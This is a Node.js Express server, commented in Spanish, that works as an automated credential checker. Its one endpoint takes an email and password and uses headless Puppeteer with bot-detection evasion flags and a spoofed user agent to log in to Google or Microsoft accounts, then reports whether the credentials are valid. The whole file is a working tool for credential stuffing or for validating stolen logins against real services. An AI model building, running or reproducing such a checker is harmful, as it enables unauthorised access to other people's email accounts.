const express = require('express');
const cors = require('cors');
const puppeteer = require('puppeteer');

const app = express();
app.use(express.json());
app.use(cors());

app.post('/api/verificar', async (req, res) => {
    const { email, password } = req.body;

    if (!email || !password) {
        return res.json({ status: 'invalid', message: 'Faltan datos' });
    }

    const domain = email.split('@')[1].toLowerCase();
    let browser;
    let page;

    try {
        const browser = await puppeteer.launch({
    headless: true,
    executablePath: '/data/data/com.termux/files/usr/bin/chromium-browser',
    args: [
        '--no-sandbox',
        '--disable-setuid-sandbox',
        '--disable-dev-shm-usage',
        '--disable-accelerated-2d-canvas',
        '--disable-gpu',
        '--single-process',
        '--disable-blink-features=AutomationControlled',
        '--disable-infobars', // NUEVO: Oculta las barras de automatización
        '--window-size=1366,768', // NUEVO: Fuerza una resolución de pantalla real de escritorio
        '--start-maximized'
    ]
});

        page = await browser.newPage();
        await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36');
        await page.setViewport({ width: 1280, height: 800 });

        if (domain === 'gmail.com') {
            // Flujo para Gmail
            await page.goto('https://accounts.google.com/', { waitUntil: 'networkidle2', timeout: 30000 });
            await page.waitForSelector('#identifierId', { timeout: 15000 });
            await page.type('#identifierId', email, { delay: 50 });
            await page.click('#identifierNext');

            await page.waitForSelector('input[name="Passwd"]', { timeout: 15000 });
            await page.type('input[name="Passwd"]', password, { delay: 50 });
            await page.click('#passwordNext');

            await new Promise(resolve => setTimeout(resolve, 5000));
            const url = page.url();
            await browser.close();

            if (url.includes('myaccount.google.com') || url.includes('signin/options')) {
                return res.json({ status: 'success', message: 'Credenciales válidas' });
            } else {
                return res.json({ status: 'invalid', message: 'Credenciales incorrectas o bloqueo de seguridad / 2FA' });
            }

        } else if (['outlook.com', 'hotmail.com', 'live.com', 'msn.com'].includes(domain)) {
            // Flujo actualizado para Microsoft / Outlook
            await page.goto('https://login.live.com/', { waitUntil: 'networkidle2', timeout: 30000 });

            await page.waitForSelector('input[name="loginfmt"]', { timeout: 15000 });
            await page.type('input[name="loginfmt"]', email, { delay: 50 });
            await page.click('#idSIButton9');

            await page.waitForSelector('input[name="passwd"]', { timeout: 15000 });
            await page.type('input[name="passwd"]', password, { delay: 50 });
            await page.click('#idSIButton9');

            await new Promise(resolve => setTimeout(resolve, 5000));
            const url = page.url();
            await browser.close();

            if (url.includes('account.microsoft.com') || url.includes('myapps.microsoft.com')) {
                return res.json({ status: 'success', message: 'Credenciales válidas' });
            } else {
                return res.json({ status: 'invalid', message: 'Credenciales incorrectas o bloqueo de seguridad / 2FA' });
            }
        } else {
            await browser.close();
            return res.json({ status: 'invalid', message: 'Dominio no soportado' });
        }

    } catch (error) {
        console.error("Detalle del error:", error.message);
        try {
            if (page) {
                await page.screenshot({ path: 'error_debug.png' });
                console.log("Captura guardada como error_debug.png");
            }
        } catch (e) {}

        if (browser) await browser.close();
        return res.status(500).json({ status: 'invalid', message: error.message });
    }
});

const PORT = process.env.PORT || 3001;
app.listen(PORT, () => {
    console.log(`Servidor con Puppeteer avanzado corriendo en el puerto ${PORT}`);
});
